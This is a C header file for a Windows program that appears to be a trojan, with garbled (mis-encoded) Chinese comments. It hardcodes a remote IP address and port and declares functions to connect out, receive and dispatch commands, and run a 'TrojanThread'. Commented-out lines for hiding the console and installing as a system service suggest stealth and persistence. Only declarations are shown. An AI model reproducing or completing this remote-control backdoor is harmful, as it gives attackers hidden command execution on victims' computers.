//////////////////////////////////////////////////////////////////////////
//ͷ�ļ�����
//////////////////////////////////////////////////////////////////////////
#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <Mswsock.h>
#pragma comment(lib,"WS2_32.lib")
#pragma comment(lib,"Mswsock.lib")
//#pragma comment(linker, "/subsystem:windows /entry:main")
//////////////////////////////////////////////////////////////////////////
//ȫ�ֱ����ͺ궨�岿��
//////////////////////////////////////////////////////////////////////////
#define DESTIP "202.202.5.241"
#define DESTPORT	1517
#define MAXLENGTH	1024*10
extern char szRecvCmd[MAXLENGTH];
extern char szSendCmd[MAXLENGTH];
extern int dwRecvSize;
extern int dwSendSize;

//////////////////////////////////////////////////////////////////////////
//������������
//////////////////////////////////////////////////////////////////////////
//���ӿͻ���
SOCKET ConnClient();
//��������
BOOL RecvCmd(SOCKET sockfd);
//���ƽ��չ̶���������
BOOL RecvData(SOCKET sockfd,char* pData,int dwSize);
//��������
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize);
//���ַ�����
BOOL DispatchCmd(SOCKET sockfd,int dwSize);
//SOCKET ERROR
BOOL SocketError(SOCKET sockfd);
//ľ���߳�
void TrojanThread(void);
//�滻Ϊϵͳ����
/*void RepService(void);*/